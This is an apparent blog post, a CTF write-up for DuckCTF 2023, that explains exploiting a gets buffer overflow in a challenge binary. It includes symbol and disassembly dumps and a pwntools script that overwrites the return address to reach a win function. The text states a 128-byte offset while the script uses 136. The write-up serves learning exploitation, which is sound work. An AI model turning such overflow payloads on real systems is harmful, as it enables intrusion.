<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width"><script type=application/javascript src=js/theme-mode.js></script><link rel=stylesheet href=css/frameworks.min.css><link rel=stylesheet href=css/github.min.css><link rel=stylesheet href=css/github-style.css><link rel=stylesheet href=css/light.css><link rel=stylesheet href=css/dark.css><link rel=stylesheet href=css/syntax.css><title>DuckCTF 2023 - Return Address Override - LachlanS7's Blog</title>
<link rel=icon type=image/x-icon href=../../../../images/github.png><meta name=theme-color content="#1e2327"><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css integrity=sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js integrity=sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4 crossorigin=anonymous></script><script defer src=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js integrity=sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa crossorigin=anonymous onload='renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"\\[",right:"\\]",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1}]})'></script></head><body><div style=position:relative><header class="Header js-details-container Details px-3 px-md-4 px-lg-5 flex-wrap flex-md-nowrap open Details--on"><div class="Header-item mobile-none" style=margin-top:-4px;margin-bottom:-4px><a class=Header-link href=./><img class=octicon height=32 width=32 src=../../../../images/GitHub-Mark-Light-32px.png></a></div><div class="Header-item d-md-none"><button class="Header-link btn-link js-details-target" type=button onclick='document.querySelector("#header-search").style.display=document.querySelector("#header-search").style.display=="none"?"block":"none"'>
<img height=24 class="octicon octicon-three-bars" width=24 src=../../../../images/GitHub-Mark-Light-32px.png></button></div><div style=display:none id=header-search class="Header-item Header-item--full flex-column flex-md-row width-full flex-order-2 flex-md-order-none mr-0 mr-md-3 mt-3 mt-md-0 Details-content--hidden-not-important d-md-flex"><div class="Header-search header-search flex-auto js-site-search position-relative flex-self-stretch flex-md-self-auto mb-3 mb-md-0 mr-0 mr-md-3 scoped-search site-scoped-search js-jump-to"><div class=position-relative><form target=_blank action=https://www.google.com/search accept-charset=UTF-8 method=get autocomplete=off><label class="Header-search-label form-control input-sm header-search-wrapper p-0 js-chromeless-input-container header-search-wrapper-jump-to position-relative d-flex flex-justify-between flex-items-center"><input type=text class="Header-search-input form-control input-sm header-search-input jump-to-field js-jump-to-field js-site-search-focus js-site-search-field is-clearable" name=q placeholder=Search autocomplete=off>
<input type=hidden name=q value=site:./></label></form></div></div></div><div class="Header-item Header-item--full flex-justify-center d-md-none position-relative"><a class=Header-link href=./><img class="octicon octicon-mark-github v-align-middle" height=32 width=32 src=../../../../images/GitHub-Mark-Light-32px.png></a></div><div class=Header-item style=margin-right:0><a href=javascript:void(0) class="Header-link no-select" onclick=switchTheme()><svg style="fill:var(--color-profile-color-modes-toggle-moon)" class="no-select" viewBox="0 0 16 16" width="16" height="16"><path fill-rule="evenodd" clip-rule="evenodd" d="M4.52208 7.71754c3.05612.0 5.53362-2.47748 5.53362-5.5336C10.0557 1.93498 10.0392 1.68986 10.0074 1.44961 9.95801 1.07727 10.3495.771159 10.6474.99992c1.4679 1.12724 2.4141 2.90007 2.4141 4.89391.0 3.40575-2.7609 6.16667-6.16665 6.16667-2.94151.0-5.40199-2.0595-6.018122-4.81523C.794841 6.87902 1.23668 6.65289 1.55321 6.85451 2.41106 7.40095 3.4296 7.71754 4.52208 7.71754z"/></svg></a></div></header></div><div><main><div class="gisthead pagehead bg-gray-light pb-0 pt-3 mb-4"><div class=px-0><div class="mb-3 d-flex px-3 px-md-3 px-lg-5"><div class="flex-auto min-width-0 width-fit mr-3"><div class=d-flex><div class="d-none d-md-block"><a class="avatar mr-2 flex-shrink-0" href=./><img class=avatar-user src=../../../../images/avatar.png width=32 height=32></a></div><div class="d-flex flex-column"><h1 class="break-word f3 text-normal mb-md-0 mb-1"><span class=author><a href=./>LachlanS7</a></span><span class=path-divider>/</span><strong class="css-truncate-target mr-1" style=max-width:410px><a href=./post/2023/duckctf/return_address_override/>DuckCTF 2023 - Return Address Override</a></strong></h1><div class="note m-0">Created <relative-time datetime="Fri, 04 Aug 2023 00:00:00 +0000" class=no-wrap>Fri, 04 Aug 2023 00:00:00 +0000</relative-time>
<span class=file-info-divider></span>
Modified <relative-time datetime="Sun, 17 Mar 2024 00:33:08 +1030" class=no-wrap>Sun, 17 Mar 2024 00:33:08 +1030</relative-time></div></div></div></div></div></div></div><div class="container-lg px-3 new-discussion-timeline"><div class="repository-content gist-content"><div><div class="js-gist-file-update-container js-task-list-container file-box"><div id=file-pytest class="file my-2"><div id=post-header class="file-header d-flex flex-md-items-center flex-items-start sticky-header" style=z-index:2><div class="file-info d-flex flex-md-items-center flex-items-start flex-order-1 flex-auto"><div class="text-mono f6 flex-auto pr-3 flex-order-2 flex-md-order-1 mt-2 mt-md-0"><summary id=toc-toggle onclick=clickToc() class="btn btn-octicon m-0 mr-2 p-2"><svg aria-hidden="true" viewBox="0 0 16 16" height="16" width="16" class="octicon octicon-list-unordered"><path fill-rule="evenodd" d="M2 4a1 1 0 100-2 1 1 0 000 2zm3.75-1.5a.75.75.0 000 1.5h8.5a.75.75.0 000-1.5h-8.5zm0 5a.75.75.0 000 1.5h8.5a.75.75.0 000-1.5h-8.5zm0 5a.75.75.0 000 1.5h8.5a.75.75.0 000-1.5h-8.5zM3 8A1 1 0 111 8a1 1 0 012 0zm-1 6a1 1 0 100-2 1 1 0 000 2z"/></svg></summary><details-menu class=SelectMenu id=toc-details style="display: none;"><div class="SelectMenu-modal rounded-3 mt-1" style=max-height:340px><div class="SelectMenu-list SelectMenu-list--borderless p-2" style=overscroll-behavior:contain id=toc-list></div></div></details-menu>695 Words</div><div class="file-actions flex-order-2 pt-0"></div></div></div><div class="Box-body px-5 pb-5" style=z-index:1><article class="markdown-body entry-content container-lg"><h1 id=duckctf-2023----return-address-override>DuckCTF 2023 &ndash; Return Address Override</h1><blockquote><p><em>Ok. So buffer overflows exist, but if I put my data in a different function, my private data will be safe from buffer overflows.</em></p><p>Author: Lachlan</p></blockquote><p>This challenge provides us with the binary, so let us begin by printing the objects in the binary with <code>objdump -t</code>:</p><pre tabindex=0><code>SYMBOL TABLE:
0000000000000000 l    df *ABS*	0000000000000000 crt1.c
0000000000000000 l    df *ABS*	0000000000000000 crtstuff.c
0000000000403e60 l     O .ctors	0000000000000000 __CTOR_LIST__
0000000000403e70 l     O .dtors	0000000000000000 __DTOR_LIST__
0000000000402070 l     O .eh_frame	0000000000000000 __EH_FRAME_BEGIN__
0000000000401090 l     F .text	0000000000000000 deregister_tm_clones
00000000004010c0 l     F .text	0000000000000000 register_tm_clones
0000000000401100 l     F .text	0000000000000000 __do_global_dtors_aux
0000000000404020 l     O .bss	0000000000000001 completed.2
0000000000404028 l     O .bss	0000000000000008 dtor_idx.1
0000000000401190 l     F .text	0000000000000000 frame_dummy
0000000000404040 l     O .bss	0000000000000030 object.0
0000000000000000 l    df *ABS*	0000000000000000 crtstuff.c
0000000000403e68 l     O .ctors	0000000000000000 __CTOR_END__
00000000004020d0 l     O .eh_frame	0000000000000000 __FRAME_END__
00000000004012b0 l     F .text	0000000000000000 __do_global_ctors_aux
0000000000000000 l    df *ABS*	0000000000000000 med.c
0000000000000000 l    df *ABS*	0000000000000000
0000000000403e80 l     O .dynamic	0000000000000000 _DYNAMIC
0000000000402000 l       .eh_frame_hdr	0000000000000000 __GNU_EH_FRAME_HDR
0000000000403fd0 l     O .got	0000000000000000 _GLOBAL_OFFSET_TABLE_
0000000000000000       F *UND*	0000000000000000 gets
0000000000404008 g     O .data	0000000000000000 .hidden __TMC_END__
0000000000403e78 g     O .dtors	0000000000000000 .hidden __DTOR_END__
0000000000000000       F *UND*	0000000000000000 puts
0000000000404000 g     O .data	0000000000000000 .hidden __dso_handle
0000000000401000 g     F .init	0000000000000001 _init
00000000004011d3 g     F .text	00000000000000a0 getName
00000000004011bd g     F .text	0000000000000016 win
0000000000401050 g       .text	0000000000000000 _start
0000000000401066 g     F .text	0000000000000024 _start_c
0000000000404008 g       .bss	0000000000000000 __bss_start
0000000000401273 g     F .text	000000000000002f main
00000000004012f1 g     F .fini	0000000000000001 _fini
0000000000404008 g       .data	0000000000000000 _edata
0000000000404078 g       .bss	0000000000000000 _end
0000000000000000       F *UND*	0000000000000000 __libc_start_main
0000000000404070 g     O .bss	0000000000000008 FLAG
</code></pre><p>As we can see, <code>gets</code> is being used, which means this program is likely vulnerable to a buffer overflow with <code>gets</code>. So, without trying anything else yet, let us see if we can cause a segfault.</p><pre tabindex=0><code>python -c &#34;print(&#39;a&#39; * 10000)&#34; | ./med
</code></pre><p>Upon running the command above, we get the following error;</p><pre tabindex=0><code>Segmentation fault (core dumped)
</code></pre><p>Awesome! This means we over-wrote the return address pushed to the stack when calling a function that calls <code>gets</code>, and thus when the function tried to return, it returned to a location that does not exist in the binary, therefore throwing an error. Hence, if we work hard enough, we can tell the function to return to a location we desire (perhaps a part of the binary that prints the flag).</p><p>To do this, we need to:</p><ol><li>Determine exactly how many characters are required in our input before we start changing the return address (this is called the offset)</li><li>Find a location that runs the code we want to run (say print the flag)</li></ol><p>The first job is easy enough. We know that 10000 characters is too many, so how about 500? That also segfaults. So how about 250? Yep, still segfaults. What about 100? Nope. Runs fine. 128? Yes. 127? Nope! This means that the offset is 128 characters (it is not 127 as there is a new line character, so when we entered 127 characters, there were really 128 characters sent, all of which did not change the return address). So our payload should be 128 random characters followed by our desired address.</p><p>To find a location in the code we might want to jump to, we can look at our symbols table again. We see that there is a function called <code>win</code>, and if we look at the assembly for <code>win</code> (with <code>objdump -t</code>);</p><pre tabindex=0><code>00000000004011bd &lt;win&gt;:
  4011bd:       55                      push   %rbp
  4011be:       48 89 e5                mov    %rsp,%rbp
  4011c1:       48 8b 05 a8 2e 00 00    mov    0x2ea8(%rip),%rax        # 404070 &lt;FLAG&gt;
  4011c8:       48 89 c7                mov    %rax,%rdi
  4011cb:       e8 60 fe ff ff          call   401030 &lt;puts@plt&gt;
  4011d0:       90                      nop
  4011d1:       5d                      pop    %rbp
  4011d2:       c3                      ret
</code></pre><p>we can see that it will print the flag. So let us jump to <code>win</code> which is at address <code>0x004011bd</code>.</p><p>The following program does just this</p><pre tabindex=0><code class="language-python=" data-lang="python=">from pwn import *

# Remote
shell = remote(&#39;chall.duckctf.com&#39;, 30003)

# Local with test flag
#shell = process([&#39;./med&#39;, &#34;flag{test flag}&#34;])

winAddress = 0x004011bd

payload = b&#39;a&#39; * 136 + p64(winAddress)

shell.sendline(payload)
shell.interactive()
</code></pre><p>Running this gives the flag <code>quack{a_simple_return_address_override}</code>.</p></article></div></div></div></div></div></div></main></div><script type=application/javascript src=js/toc.js></script><link rel=stylesheet href=css/toc.css><div id=gitalk-container class=gitalk-container></div><link rel=stylesheet href=css/gitalk.css><script src=js/gitalk.min.js></script><script>const gitalk=new Gitalk({clientID:"Your client ID",clientSecret:"Your client secret",repo:"repo",owner:"LachlanS7",admin:["LachlanS7"],id:eval("location.pathname"),distractionFreeMode:!1});(function(){gitalk.render("gitalk-container")})()</script><div class="footer container-xl width-full p-responsive"><div class="position-relative d-flex flex-row-reverse flex-lg-row flex-wrap flex-lg-nowrap flex-justify-center flex-lg-justify-between flex-sm-items-center pt-6 pb-2 mt-6 f6 text-gray border-top border-gray-light"><a aria-label=Homepage title=GitHub class="footer-octicon d-none d-lg-block mr-lg-4" href=./><svg height="24" class="octicon octicon-mark-github" viewBox="0 0 16 16" width="24"><path fill-rule="evenodd" d="M8 0C3.58.0.0 3.58.0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38.0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95.0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12.0.0.67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15.0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48.0 1.07-.01 1.93-.01 2.2.0.21.15.46.55.38A8.013 8.013.0 0016 8c0-4.42-3.58-8-8-8z"/></svg></a><ul class="list-style-none d-flex flex-wrap col-12 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0"><li class="mr-3 mr-lg-0">Theme by <a href=https://github.com/MeiK2333/github-style>github-style</a></li></ul></div><div class="d-flex flex-justify-center pb-6"><span class="f6 text-gray-light"></span></div></div></body><script type=application/javascript src=js/github-style.js></script><link rel=stylesheet href=https://fastly.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css integrity=sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq crossorigin=anonymous><script defer src=https://fastly.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js integrity=sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz crossorigin=anonymous></script><script defer src=https://fastly.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js integrity=sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI crossorigin=anonymous onload=renderMathInElement(document.body)></script></html>